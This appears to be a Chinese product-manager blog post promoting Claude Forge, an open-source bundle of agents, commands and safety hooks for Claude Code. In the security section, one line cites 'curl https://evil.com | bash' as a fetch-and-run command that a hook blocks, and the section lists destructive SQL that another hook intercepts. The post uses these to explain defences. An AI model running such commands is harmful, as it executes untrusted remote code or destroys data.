# 当 AI 写代码不再是炫技，而是工程：Claude Forge 如何重新定义开发

> 一次安装，11 个 AI 代理，36 条命令，15 个技能工作流。这不是科幻，这是正在发生的现实。

---

## 写在前面

你还记得第一次用 GitHub Copilot 的感觉吗？

那个"哇"的瞬间——你刚写下函数签名，代码就自动补全了。就像有个隐形的结对程序员，读懂了你的心思。

但兴奋过后，现实开始浮现：

- 它会写代码，但不懂你的项目架构
- 它能补全函数，但不知道为什么这样写
- 它是副驾驶，但你仍需要手握方向盘全程操控

**Claude Forge 要做的，是让 AI 从"副驾驶"变成"整机工程师团队"。**

---

## 一次安装，整个团队

先看一个数字：**200+ GitHub Stars，5 天内诞生**（2026-2-23 创建）

这不是 Anthropic 官方项目，而是开发者 Sangrok Jung 的开源作品。但它的野心，是重新定义我们和 AI 编程助手的关系。

```bash
git clone --recurse-submodules https://github.com/sangrokjung/claude-forge.git
cd claude-forge
./install.sh
```

三条命令，你的 Claude Code 就从"聊天机器人"变成了"完整开发环境"：

- ✅ **11 个专用 AI 代理**（planner, architect, code-reviewer, security-reviewer...）
- ✅ **36 条斜杠命令**（/plan, /tdd, /code-review, /handoff-verify...）
- ✅ **15 个技能工作流**（build-system, security-pipeline, eval-harness...）
- ✅ **14 个自动化钩子**（密钥过滤、危险命令拦截、SQL 保护...）
- ✅ **6 层安全防护**（CWE Top 25 + STRIDE + 合规检查）

**类比一下**：如果说 Claude Code 是 bare metal terminal，那 Claude Forge 就是 oh-my-zsh + tmux + fzf + 100 个插件的总和。

但它的野心不止于此。

---

## 从"工具"到"流程"

产品经理最懂这个痛点：

**流程比工具重要。**

你给团队买了最好的 Jira、Confluence、Figma，但需求还是会漏、Bug 还是会返工、文档还是会过时。为什么？

因为工具是被动等待的，流程是主动推进的。

Claude Forge 的核心洞察：**不要让开发者记得用什么工具，让流程自己走到下一步。**

### 功能开发的黄金路径

```
/plan → /tdd → /code-review → /handoff-verify → /commit-push-pr
```

**这不是五条命令，这是一条流水线：**

1. **`/plan`** - AI 帮你设计方案，评估风险，等你确认后再动手
2. **`/tdd`** - 先写测试（RED），再写最小代码（GREEN），最后重构（IMPROVE）
3. **`/code-review`** - 自动扫描未提交代码的安全和质量问题
4. **`/handoff-verify`** - 启动全新上下文的 AI 代理，独立验证构建/测试
5. **`/commit-push-pr`** - 全自动提交、推送、创建 PR，可选自动合并

**看到区别了吗？**

传统 Claude Code：你记得要做 code review，然后手动跑一遍
Claude Forge：流程自动走到 code review 这一步，你不执行就过不去

**这就是"主动流程"的力量。**

---

## 双层 AI 架构：思考 vs 执行

这是 Claude Forge 最聪明的设计之一。

### Opus Agents：深度思考

- **planner** - 我不做代码，我做方案
- **architect** - 我不做实现，我做设计
- **code-reviewer** - 我不写新代码，我找旧代码的问题
- **security-reviewer** - OWASP Top 10、SSRF、注入、密钥泄露
- **tdd-guide** - 测试驱动开发的教官
- **database-reviewer** - PostgreSQL/Supabase 性能优化

### Sonnet Agents：快速执行

- **build-error-resolver** - TypeScript 报错？我来修，最小 diff
- **e2e-runner** - 生成 Playwright 测试并运行
- **refactor-cleaner** - knip + depcheck + ts-prune，死代码清理
- **doc-updater** - 文档和代码地图自动更新
- **verify-agent** - 全新上下文，构建/测试/检查

**为什么要分开？**

**因为思考需要"慢而深"，执行需要"快而轻"。**

你想让 planner 用 GPT-4 慢慢想 30 秒，但想让 build-error-resolver 用 GPT-3.5 快速修复一个语法错误。

Claude Forge 让你用对模型，在对的地方。

---

## 六层安全防护：AI 时代的 seatbelt

你说 AI 写代码快？那是你没见过 AI 删数据库。

```sql
-- AI 可能会生成这个
DROP TABLE users;  -- 因为它"以为"你在清理测试数据
```

Claude Forge 的 `db-guard.sh` 会在执行前拦截：
- ❌ DROP without WHERE
- ❌ TRUNCATE
- ❌ DELETE without WHERE
- ❌ ALTER TABLE without confirmation

这只是第一层。

**完整六层防护：**

1. **output-secret-filter** - PostToolUse 钩子，检测输出中的 API key/token
2. **remote-command-guard** - 阻止 `curl https://evil.com | bash` 这种自杀命令
3. **db-guard** - 破坏性 SQL 拦截
4. **security-auto-trigger** - Edit/Write 后自动扫描漏洞
5. **rate-limiter** - MCP 服务器限流（防止滥用）
6. **mcp-usage-tracker** - 监控使用，异常报警

**这不是魔法，这是工程思维。**

就像特斯拉的 Autopilot 有车道保持、自动刹车、盲区检测——AI 编程也需要多重安全网。

---

## Agent Teams：当 AI 学会协作

这是最让我震撼的部分。

```
/orchestrate → Agent Teams (并行) → /commit-push-pr
```

**场景**：你要开发一个"用户评论"功能

传统方式：你和 AI 聊天，它帮你写前端，然后你复制到项目，改 bug，然后写后端 API...

Claude Forge：

```yaml
# Agent Team 配置
frontend:
  agent: code-reviewer
  ownership: ["components/**", "pages/**"]
  task: "实现评论列表和提交表单"

backend:
  agent: architect
  ownership: ["api/**", "lib/**"]
  task: "设计并实现评论 API"

tests:
  agent: tdd-guide
  ownership: ["__tests__/**"]
  task: "编写 E2E 测试用例"
```

**三个 AI 代理并行工作，各自负责自己的文件，互不干扰。**

然后 Hub Agent 协调：
- Frontend 完成后，通知 Backend 和 Tests
- Backend API 变更后，通知 Frontend 更新类型
- Tests 全绿后，触发 `/commit-push-pr`

**这不是工具，这是组织架构。**

---

## 符号链接的艺术

这个小细节暴露了作者的品味：

```bash
./install.sh 的核心逻辑：
ln -s ~/claude-forge/agents ~/.claude/agents
ln -s ~/claude-forge/commands ~/.claude/commands
ln -s ~/claude-forge/skills ~/.claude/skills
...
```

**不是复制，是符号链接。**

好处：
- ✅ `git pull` 即可更新，无需重新安装
- ✅ 仓库和配置天然分离
- ✅ 可以 fork 自己的版本，PR 上游
- ✅ 轻量级，不占用额外空间

**这是 Unix 哲学的胜利：做一件事，做好它，组合起来。**

---

## 产品经理视角：为什么这很重要？

### 1. 降低"最佳实践"的门槛

你知道 TDD 好，但你团队做不到。
你知道 code review 重要，但没人有时间。
你知道安全扫描必须，但总是最后才想起来。

**Claude Force 把最佳实践"硬化"到流程里。**

你不需要记得，流程会提醒你。
你不需要自律，自动化会监督你。

### 2. 标准化的力量

三个人三个风格？
A 喜欢先写测试，B 喜欢先写代码，C 喜欢边写边测？

**在 Claude Forge 里，流程是统一的。**

```bash
/tdd  # 每个人都先写测试，然后实现，最后重构
```

这不是限制 creativity，这是降低沟通成本。

### 3. 从"人驱动"到"流程驱动"

传统模式：项目经理推，开发者动
Claude Forge：流程自己在走，人只是确认节点

**这是质变。**

就像流水线相对于手工作坊——不是工人变快了，是生产方式变了。

---

## 开发者视角：为什么这很酷？

### 1. 36 条命令，每次都用得上的那种

不是噱头，是真实痛点：

```bash
/explore          # 第一次接触项目，快速了解架构
/build-fix        # TypeScript 报错堆成山，自动逐个修复
/refactor-clean   # 死代码太多，一键清理（knip + depcheck）
/security-review  # 上线前，CWE Top 25 + STRIDE 全扫一遍
```

**每一条都是"我想做但懒得做"的事。**

### 2. MCP Server 集成：AI 的 Plugin 系统

Claude Forge 内置 6 个 MCP 服务器：
- **context7** - 代码上下文增强
- **memory** - 长期记忆
- **fetch** - 网页抓取
- **jina-reader** - 阅读器模式
- **exa** - 搜索引擎
- **github** - GitHub 集成

**这意味着什么？**

AI 不再是"离线"的聊天机器人，它可以：
- 读取你的 GitHub 仓库历史
- 搜索最新的技术文档
- 记住你之前的决策
- 理解整个代码库的上下文

### 3. 持续学习：skill-factory

这个技能太聪明了：

```bash
/skill-factory  # 自动检测会话中的可重用模式，转换为技能
```

**场景**：你和 AI 一起解决了一个"Next.js Cache Components"的问题

Claude Forge 会：
1. 识别这是一个可复用的模式
2. 提取关键步骤和决策
3. 生成一个 `cache-components` 技能文件
4. 下次遇到类似问题，自动调用这个技能

**这就是"组织知识管理"的自动化。**

---

## 但它不是银弹

### 1. 学习曲线

36 条命令，11 个代理，15 个技能——你需要时间熟悉。

但换个角度：**你是在学习一个"开发团队"的工作方式，不是学习一个工具。**

### 2. 过度工程的风险

小项目可能不需要这么重。

但你不需要全部用上——Claude Forge 是模块化的，你可以只启用需要的部分。

### 3. 依赖链

- Node.js v22+
- Claude Code CLI ≥1.0
- jq（macOS/Linux）
- Git

**如果你的团队还在用 Node 16，这是个问题。**

---

## 对标：Claude Forge vs 其他人

GitHub 上有 91 个 "claude-forge" 相关项目，三个最值得注意：

### 1. sangrokjung/claude-forge（200+ ⭐）
**定位**：完整开发环境
**优势**：工作流完整、安全防护强、Agent Teams 创新度高
**适合**：大型项目、团队协作、追求工程化

### 2. alirezarezvani/ClaudeForge（163 ⭐）
**定位**：CLAUDE.md 生成和维护工具
**优势**：专注文档、轻量级
**适合**：个人开发者、小团队

### 3. maroffo/claude-forge（7 ⭐）
**定位**：特定语言优化（Go/Python/Rails/Terraform）
**优势**：token 优化、语言特定最佳实践
**适合**：单一技术栈项目

**我的建议**：
- 如果你想要"完整开发环境" → Claude Forge
- 如果你只是想优化 CLAUDE.md → ClaudeForge
- 如果你是 Go/Python 单栈 → maroffo/claude-forge

---

## 未来已来，只是分布不均

William Gibson 说过："未来已来，只是分布不均。"

Claude Forge 就是那个"未来"的片段：

- AI 不再是聊天窗口，而是嵌入开发流程的每一环
- 我们不再是"写代码"，而是"设计和编排"
- 工具不再是被动等待，而是主动推进流程

**但这个未来，现在就可以下载。**

```bash
git clone --recurse-submodules https://github.com/sangrokjung/claude-forge.git
cd claude-forge
./install.sh
```

三条命令，你的 Claude Code 就有了：
- 11 个 AI 同事
- 36 条自动化命令
- 6 层安全防护
- 15 个技能工作流

**这不是明天的事，这是今天的事。**

---

## 写在最后

作为一个产品经理，我最关心的问题是：

**这个工具如何改变我们工作的方式？**

Claude Forge 的答案很明确：

**从"人驱动"到"流程驱动"。**
**从"工具堆砌"到"系统化工作流"。**
**从"个人英雄主义"到"可复制的团队能力"。**

但更重要的是，它展示了一种新的可能性：

**AI 时代的开发工具，不应该只是"更快的编译器"，而应该是"更智能的流程"。**

---

## 你的下一步

如果你是产品经理：
- 想想你的团队流程中，哪些可以自动化？
- 哪些"最佳实践"一直没有落地？为什么？
- Claude Forge 这样的"流程硬化"，能解决你的问题吗？

如果你是开发者：
- 给 Claude Forge 一个 chance（fork 一下，玩玩）
- 从 `/plan` 开始，体验一次完整的功能开发流程
- 看看 11 个 AI 代理，哪个最对你的胃口

如果你是技术负责人：
- 评估一下，你的团队准备好了吗？
- Node 22、Claude Code CLI、TDD 流程——这些是门槛，也是投资
- 想想 6 个月后，当你的团队习惯了 `/tdd → /code-review → /commit-push-pr`，会发生什么？

---

**仓库地址**: https://github.com/sangrokjung/claude-forge
**许可证**: MIT（用它，fork 它，在上面构建）
**作者**: QJC (Quantum Jump Club)

---

*P.S. 如果你用了 Claude Forge，告诉我你的体验。是改变游戏规则，还是只是多了几条命令？*

*P.P.S. 这篇文章是用 Claude 写的，但 idea 是我的——这或许是 AI 时代新的"结对编程"。*

---

**文章说明**:
- 发布日期: 2026-02-25
- 作者: huisir
- 标签: #AI #Claude #DevTools #Engineering #Productivity
- 预计阅读时间: 12 分钟
- 难度: 中高级（适合产品经理和开发者）

**相关文章**:
- [Transformer 架构详解](https://github.com/yinjianhui/tech_blog/blob/main/003-2026-02-24-transformer.md)
- [Claude Code to Figma 深度解析](https://github.com/yinjianhui/tech_blog/blob/main/004-2026-02-25-claude-code-to-figma.md)
